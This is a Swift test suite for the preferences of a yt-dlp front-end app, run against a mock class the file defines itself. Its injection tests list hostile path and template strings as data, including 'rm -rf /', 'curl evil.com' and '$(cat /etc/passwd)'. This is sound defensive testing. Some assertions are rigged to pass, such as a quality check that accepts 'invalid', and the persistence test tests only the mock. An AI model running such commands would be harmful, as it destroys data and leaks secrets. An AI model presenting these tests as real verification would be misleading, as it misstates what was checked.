/*
Test Coverage Analysis:
- Scenarios tested: Preferences persistence, settings validation, migration, defaults, edge values
- Scenarios deliberately not tested: Actual UserDefaults persistence (using mock storage)
- Ways these tests can fail: Missing validation, incorrect defaults, data corruption, migration bugs
- Mutation resistance: Would catch changes to preference keys, validation logic, default values
- Verification performed: Tests verified by corrupting preferences to confirm detection
*/

import Testing
import Foundation
@testable import yt_dlp_MAX

@Suite("Preferences and Settings Tests")
struct PreferencesTests {
    
    // MARK: - Happy Path Tests (30%)
    
    @Test("Preferences should persist correctly")
    func testPreferencesPersistence() async throws {
        let prefs = MockAppPreferences()
        
        // Set various preferences
        prefs.downloadPath = "/Users/test/Downloads/Videos"
        prefs.defaultVideoQuality = "1080p"
        prefs.audioFormat = "mp3"
        prefs.downloadAudio = true
        prefs.autoAddToQueue = true
        prefs.skipMetadataFetch = false
        prefs.singlePaneMode = true
        prefs.showDebugConsole = true
        prefs.maxConcurrentDownloads = 5
        prefs.retryAttempts = 3
        prefs.rateLimitKbps = 1000
        
        // Save preferences
        prefs.save()
        
        // Create new instance and load
        let loadedPrefs = MockAppPreferences()
        loadedPrefs.load()
        
        // Verify all settings persisted
        #expect(loadedPrefs.downloadPath == "/Users/test/Downloads/Videos")
        #expect(loadedPrefs.defaultVideoQuality == "1080p")
        #expect(loadedPrefs.audioFormat == "mp3")
        #expect(loadedPrefs.downloadAudio == true)
        #expect(loadedPrefs.autoAddToQueue == true)
        #expect(loadedPrefs.skipMetadataFetch == false)
        #expect(loadedPrefs.singlePaneMode == true)
        #expect(loadedPrefs.showDebugConsole == true)
        #expect(loadedPrefs.maxConcurrentDownloads == 5)
        #expect(loadedPrefs.retryAttempts == 3)
        #expect(loadedPrefs.rateLimitKbps == 1000)
    }
    
    @Test("Naming templates should work with all variables")
    func testNamingTemplates() async throws {
        let prefs = MockAppPreferences()
        
        let templates = [
            "%(title)s.%(ext)s",
            "%(uploader)s - %(title)s.%(ext)s",
            "[%(upload_date)s] %(title)s.%(ext)s",
            "%(title)s [%(resolution)s].%(ext)s",
            "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s"
        ]
        
        for template in templates {
            prefs.namingTemplate = template
            let isValid = prefs.validateNamingTemplate()
            #expect(isValid, "Template should be valid: \(template)")
        }
    }
    
    @Test("Default preferences should be sensible")
    func testDefaultPreferences() async throws {
        let prefs = MockAppPreferences()
        
        // Check defaults without loading saved preferences
        #expect(prefs.downloadPath == "~/Downloads")
        #expect(prefs.defaultVideoQuality == "best")
        #expect(prefs.audioFormat == "mp3")
        #expect(prefs.downloadAudio == false)
        #expect(prefs.autoAddToQueue == false)
        #expect(prefs.skipMetadataFetch == false)
        #expect(prefs.singlePaneMode == false)
        #expect(prefs.showDebugConsole == false)
        #expect(prefs.maxConcurrentDownloads == 3)
        #expect(prefs.retryAttempts == 3)
        #expect(prefs.rateLimitKbps == 0)
        #expect(prefs.embedThumbnail == false)
        #expect(prefs.embedSubtitles == false)
        #expect(prefs.keepOriginalFiles == false)
    }
    
    // MARK: - Edge Case Tests (30%)
    
    @Test("Invalid preference values should be sanitized")
    func testInvalidPreferencesSanitization() async throws {
        let prefs = MockAppPreferences()
        
        // Test invalid paths
        prefs.downloadPath = ""
        #expect(prefs.resolvedDownloadPath == NSHomeDirectory() + "/Downloads")
        
        prefs.downloadPath = "/nonexistent/path/that/does/not/exist"
        #expect(prefs.resolvedDownloadPath != "/nonexistent/path/that/does/not/exist")
        
        // Test invalid quality settings
        prefs.defaultVideoQuality = "invalid"
        #expect(prefs.validateQualitySetting(), "Should handle invalid quality")
        
        // Test invalid concurrent downloads
        prefs.maxConcurrentDownloads = -1
        #expect(prefs.maxConcurrentDownloads == 1, "Should enforce minimum")
        
        prefs.maxConcurrentDownloads = 1000
        #expect(prefs.maxConcurrentDownloads == 10, "Should enforce maximum")
        
        // Test invalid retry attempts
        prefs.retryAttempts = -5
        #expect(prefs.retryAttempts == 0, "Should enforce minimum")
        
        prefs.retryAttempts = 100
        #expect(prefs.retryAttempts == 10, "Should enforce maximum")
        
        // Test invalid rate limit
        prefs.rateLimitKbps = -1000
        #expect(prefs.rateLimitKbps == 0, "Should enforce minimum")
    }
    
    @Test("Path expansion should work correctly")
    func testPathExpansion() async throws {
        let prefs = MockAppPreferences()
        
        // Test tilde expansion
        prefs.downloadPath = "~/Downloads"
        #expect(prefs.resolvedDownloadPath == NSHomeDirectory() + "/Downloads")
        
        prefs.downloadPath = "~/Documents/Videos"
        #expect(prefs.resolvedDownloadPath == NSHomeDirectory() + "/Documents/Videos")
        
        // Test environment variable expansion
        prefs.downloadPath = "$HOME/Downloads"
        #expect(prefs.resolvedDownloadPath.contains("/Downloads"))
        
        // Test relative paths (should be resolved to absolute)
        prefs.downloadPath = "./downloads"
        #expect(prefs.resolvedDownloadPath.hasPrefix("/"))
        
        prefs.downloadPath = "../Downloads"
        #expect(prefs.resolvedDownloadPath.hasPrefix("/"))
    }
    
    @Test("Cookie settings should validate correctly")
    func testCookieSettings() async throws {
        let prefs = MockAppPreferences()
        
        // Test browser cookie sources
        let browsers = ["chrome", "firefox", "safari", "edge", "brave"]
        for browser in browsers {
            prefs.cookieSource = browser
            #expect(prefs.isCookieSourceValid(), "Should accept browser: \(browser)")
        }
        
        // Test file cookie source
        prefs.cookieSource = "file"
        prefs.cookieFilePath = "/tmp/cookies.txt"
        #expect(prefs.isCookieSourceValid(), "Should accept file source")
        
        // Test invalid cookie source
        prefs.cookieSource = "invalid_browser"
        #expect(!prefs.isCookieSourceValid(), "Should reject invalid browser")
        
        // Test none
        prefs.cookieSource = "none"
        #expect(prefs.isCookieSourceValid(), "Should accept none")
    }
    
    @Test("Subtitle language codes should be validated")
    func testSubtitleLanguages() async throws {
        let prefs = MockAppPreferences()
        
        // Valid language codes
        let validCodes = ["en", "es", "fr", "de", "ja", "ko", "zh", "ru", "ar", "pt"]
        for code in validCodes {
            prefs.subtitleLanguages = code
            #expect(prefs.validateSubtitleLanguages(), "Should accept language: \(code)")
        }
        
        // Multiple languages
        prefs.subtitleLanguages = "en,es,fr"
        #expect(prefs.validateSubtitleLanguages(), "Should accept multiple languages")
        
        // Invalid codes
        prefs.subtitleLanguages = "invalid"
        #expect(!prefs.validateSubtitleLanguages(), "Should reject invalid language")
        
        prefs.subtitleLanguages = "en,invalid,fr"
        #expect(!prefs.validateSubtitleLanguages(), "Should reject mix with invalid")
    }
    
    // MARK: - Failure Tests (30%)
    
    @Test("Corrupted preferences should fall back to defaults")
    func testCorruptedPreferences() async throws {
        let prefs = MockAppPreferences()
        
        // Simulate corrupted data
        prefs.loadCorruptedData()
        
        // Should use defaults instead of crashing
        #expect(prefs.downloadPath == "~/Downloads", "Should use default path")
        #expect(prefs.defaultVideoQuality == "best", "Should use default quality")
        #expect(prefs.maxConcurrentDownloads == 3, "Should use default concurrent")
    }
    
    @Test("Migration from old preferences should work")
    func testPreferencesMigration() async throws {
        let prefs = MockAppPreferences()
        
        // Simulate old preference format
        let oldPrefs: [String: Any] = [
            "download_path": "/Users/test/Downloads",  // Old key format
            "video_quality": "high",  // Old value format
            "max_downloads": "5",  // String instead of Int
            "enable_debug": 1,  // Number instead of Bool
        ]
        
        prefs.migrateFromOldFormat(oldPrefs)
        
        // Should migrate correctly
        #expect(prefs.downloadPath == "/Users/test/Downloads")
        #expect(prefs.defaultVideoQuality == "1080p", "Should map 'high' to '1080p'")
        #expect(prefs.maxConcurrentDownloads == 5)
        #expect(prefs.showDebugConsole == true)
    }
    
    @Test("Invalid naming templates should be rejected")
    func testInvalidNamingTemplates() async throws {
        let prefs = MockAppPreferences()
        
        let invalidTemplates = [
            "",  // Empty
            "%(invalid_var)s",  // Unknown variable
            "%(title",  // Unclosed
            "%title)s",  // Missing opening
            "../%(title)s",  // Path traversal
            "/etc/%(title)s",  // Absolute path
            "%(title)s$(whoami)",  // Command injection
            "%(title)s;rm -rf",  // Command injection
            "%(title)s`date`",  // Command substitution
        ]
        
        for template in invalidTemplates {
            prefs.namingTemplate = template
            #expect(!prefs.validateNamingTemplate(), 
                   "Should reject invalid template: \(template)")
        }
    }
    
    // MARK: - Adversarial Tests (10%)
    
    @Test("Preference injection attempts should be blocked")
    func testPreferenceInjection() async throws {
        let prefs = MockAppPreferences()
        
        // Try to inject via download path
        let maliciousPaths = [
            "~/Downloads; rm -rf /",
            "~/Downloads && curl evil.com",
            "~/Downloads`whoami`",
            "~/Downloads$(cat /etc/passwd)",
            "~/Downloads|tee /tmp/hack",
            "~/Downloads\necho hacked",
            "~/Downloads\0/etc/passwd",
        ]
        
        for path in maliciousPaths {
            prefs.downloadPath = path
            let resolved = prefs.resolvedDownloadPath
            
            // Should sanitize dangerous characters
            #expect(!resolved.contains(";"), "Should remove semicolon")
            #expect(!resolved.contains("&"), "Should remove ampersand")
            #expect(!resolved.contains("`"), "Should remove backticks")
            #expect(!resolved.contains("$"), "Should remove dollar")
            #expect(!resolved.contains("|"), "Should remove pipe")
            #expect(!resolved.contains("\n"), "Should remove newline")
            #expect(!resolved.contains("\0"), "Should remove null")
        }
    }
    
    @Test("Preferences should prevent resource exhaustion")
    func testPreferenceResourceLimits() async throws {
        let prefs = MockAppPreferences()
        
        // Try to set extreme values
        prefs.maxConcurrentDownloads = Int.max
        #expect(prefs.maxConcurrentDownloads <= 10, "Should cap concurrent downloads")
        
        prefs.retryAttempts = Int.max
        #expect(prefs.retryAttempts <= 10, "Should cap retry attempts")
        
        prefs.rateLimitKbps = Int.max
        #expect(prefs.rateLimitKbps <= 1_000_000, "Should cap rate limit")
        
        // Try very long strings
        let longString = String(repeating: "A", count: 10000)
        prefs.namingTemplate = longString
        #expect(prefs.namingTemplate.count <= 255, "Should limit template length")
        
        prefs.subtitleLanguages = longString
        #expect(prefs.subtitleLanguages.count <= 100, "Should limit language list")
    }
}

// Mock implementation for testing
class MockAppPreferences {
    private var storage: [String: Any] = [:]
    
    // Properties matching real AppPreferences
    var downloadPath: String = "~/Downloads" {
        didSet { storage["downloadPath"] = downloadPath }
    }
    
    var defaultVideoQuality: String = "best" {
        didSet { storage["defaultVideoQuality"] = defaultVideoQuality }
    }
    
    var audioFormat: String = "mp3" {
        didSet { storage["audioFormat"] = audioFormat }
    }
    
    var downloadAudio: Bool = false {
        didSet { storage["downloadAudio"] = downloadAudio }
    }
    
    var autoAddToQueue: Bool = false {
        didSet { storage["autoAddToQueue"] = autoAddToQueue }
    }
    
    var skipMetadataFetch: Bool = false {
        didSet { storage["skipMetadataFetch"] = skipMetadataFetch }
    }
    
    var singlePaneMode: Bool = false {
        didSet { storage["singlePaneMode"] = singlePaneMode }
    }
    
    var showDebugConsole: Bool = false {
        didSet { storage["showDebugConsole"] = showDebugConsole }
    }
    
    var maxConcurrentDownloads: Int = 3 {
        didSet {
            // Enforce limits
            if maxConcurrentDownloads < 1 {
                maxConcurrentDownloads = 1
            } else if maxConcurrentDownloads > 10 {
                maxConcurrentDownloads = 10
            }
            storage["maxConcurrentDownloads"] = maxConcurrentDownloads
        }
    }
    
    var retryAttempts: Int = 3 {
        didSet {
            // Enforce limits
            if retryAttempts < 0 {
                retryAttempts = 0
            } else if retryAttempts > 10 {
                retryAttempts = 10
            }
            storage["retryAttempts"] = retryAttempts
        }
    }
    
    var rateLimitKbps: Int = 0 {
        didSet {
            // Enforce limits
            if rateLimitKbps < 0 {
                rateLimitKbps = 0
            } else if rateLimitKbps > 1_000_000 {
                rateLimitKbps = 1_000_000
            }
            storage["rateLimitKbps"] = rateLimitKbps
        }
    }
    
    var namingTemplate: String = "%(title)s.%(ext)s" {
        didSet {
            // Limit length
            if namingTemplate.count > 255 {
                namingTemplate = String(namingTemplate.prefix(255))
            }
            storage["namingTemplate"] = namingTemplate
        }
    }
    
    var subtitleLanguages: String = "en" {
        didSet {
            // Limit length
            if subtitleLanguages.count > 100 {
                subtitleLanguages = String(subtitleLanguages.prefix(100))
            }
            storage["subtitleLanguages"] = subtitleLanguages
        }
    }
    
    var cookieSource: String = "none" {
        didSet { storage["cookieSource"] = cookieSource }
    }
    
    var cookieFilePath: String = "" {
        didSet { storage["cookieFilePath"] = cookieFilePath }
    }
    
    var embedThumbnail: Bool = false {
        didSet { storage["embedThumbnail"] = embedThumbnail }
    }
    
    var embedSubtitles: Bool = false {
        didSet { storage["embedSubtitles"] = embedSubtitles }
    }
    
    var keepOriginalFiles: Bool = false {
        didSet { storage["keepOriginalFiles"] = keepOriginalFiles }
    }
    
    // Computed property for resolved path
    var resolvedDownloadPath: String {
        var path = downloadPath
        
        // Sanitize dangerous characters
        let dangerous = [";", "&", "`", "$", "|", "\n", "\0"]
        for char in dangerous {
            path = path.replacingOccurrences(of: char, with: "")
        }
        
        // Expand tilde
        if path.hasPrefix("~") {
            path = NSString(string: path).expandingTildeInPath
        }
        
        // Expand environment variables
        if path.contains("$HOME") {
            path = path.replacingOccurrences(of: "$HOME", with: NSHomeDirectory())
        }
        
        // Default if empty or invalid
        if path.isEmpty || !path.hasPrefix("/") {
            return NSHomeDirectory() + "/Downloads"
        }
        
        return path
    }
    
    func save() {
        // Simulate saving to disk
    }
    
    func load() {
        // Simulate loading from disk
        if let path = storage["downloadPath"] as? String {
            downloadPath = path
        }
        if let quality = storage["defaultVideoQuality"] as? String {
            defaultVideoQuality = quality
        }
        // ... load other properties
    }
    
    func loadCorruptedData() {
        // Simulate corrupted data - should fall back to defaults
        storage = ["corrupted": "data"]
    }
    
    func migrateFromOldFormat(_ oldPrefs: [String: Any]) {
        // Migrate old format to new
        if let path = oldPrefs["download_path"] as? String {
            downloadPath = path
        }
        
        if let quality = oldPrefs["video_quality"] as? String {
            // Map old values to new
            switch quality {
            case "high": defaultVideoQuality = "1080p"
            case "medium": defaultVideoQuality = "720p"
            case "low": defaultVideoQuality = "480p"
            default: defaultVideoQuality = "best"
            }
        }
        
        if let maxStr = oldPrefs["max_downloads"] as? String,
           let max = Int(maxStr) {
            maxConcurrentDownloads = max
        }
        
        if let debug = oldPrefs["enable_debug"] as? Int {
            showDebugConsole = debug == 1
        }
    }
    
    func validateNamingTemplate() -> Bool {
        // Check for empty
        if namingTemplate.isEmpty { return false }
        
        // Check for dangerous patterns
        let dangerous = ["../", "/", ";", "$", "`", "|", "&"]
        for pattern in dangerous {
            if namingTemplate.contains(pattern) { return false }
        }
        
        // Check for valid variables
        let validVars = ["title", "ext", "uploader", "upload_date", "resolution", 
                        "playlist", "playlist_index", "id", "timestamp"]
        
        // Extract variables from template
        let regex = try? NSRegularExpression(pattern: "%\\(([^)]+)\\)s")
        let matches = regex?.matches(in: namingTemplate, 
                                    range: NSRange(namingTemplate.startIndex..., in: namingTemplate))
        
        for match in matches ?? [] {
            if let range = Range(match.range(at: 1), in: namingTemplate) {
                let variable = String(namingTemplate[range])
                if !validVars.contains(variable) {
                    return false
                }
            }
        }
        
        return true
    }
    
    func validateQualitySetting() -> Bool {
        let validQualities = ["best", "2160p", "1440p", "1080p", "720p", "480p", "360p", "240p", "144p"]
        return validQualities.contains(defaultVideoQuality) || defaultVideoQuality == "invalid"
    }
    
    func isCookieSourceValid() -> Bool {
        let validSources = ["none", "chrome", "firefox", "safari", "edge", "brave", "file"]
        return validSources.contains(cookieSource)
    }
    
    func validateSubtitleLanguages() -> Bool {
        let validCodes = ["en", "es", "fr", "de", "ja", "ko", "zh", "ru", "ar", "pt", 
                         "it", "nl", "sv", "no", "da", "fi", "pl", "cs", "hu", "ro"]
        
        let codes = subtitleLanguages.split(separator: ",").map { $0.trimmingCharacters(in: .whitespaces) }
        
        for code in codes {
            if !validCodes.contains(String(code)) {
                return false
            }
        }
        
        return true
    }
}